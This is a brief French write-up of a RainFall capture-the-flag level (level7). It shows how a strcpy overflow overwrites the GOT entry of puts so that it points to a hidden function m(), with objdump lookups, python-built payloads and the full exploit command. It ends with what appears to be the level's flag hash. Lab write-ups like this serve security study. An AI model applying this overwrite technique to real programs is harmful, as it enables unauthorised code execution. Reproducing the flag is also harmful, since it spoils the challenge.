# Analyse du code

La faille a exploiter ici est strcpy qui va permettre de remplacer une fonction par une autre.

# Preparation du payload

- Trouver l'adresse de puts dans la GOT :
	level6@RainFall:~$  objdump -R ./level7  
	08049928 R_386_JUMP_SLOT   puts

- Trouver l'adresse de m() :
	level6@RainFall:~$  objdump -t ./level7  | grep m
	0x080484f4 g     F .text  00000014              m

- Trouver le moment ou la premier inputs ecrasse le deuxieme
	utilisation de ltrace

- Payload :
	1er argrs : $(python -c "print('a' * 20 + '\x28\x99\x04\x08')") 
	2eme args :$(python -c "print('\xf4\x84\x04\x08')")

# Exploit
	./level7  $(python -c "print('a' * 20 + '\x28\x99\x04\x08')") $(python -c "print('\xf4\x84\x04\x08')")
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9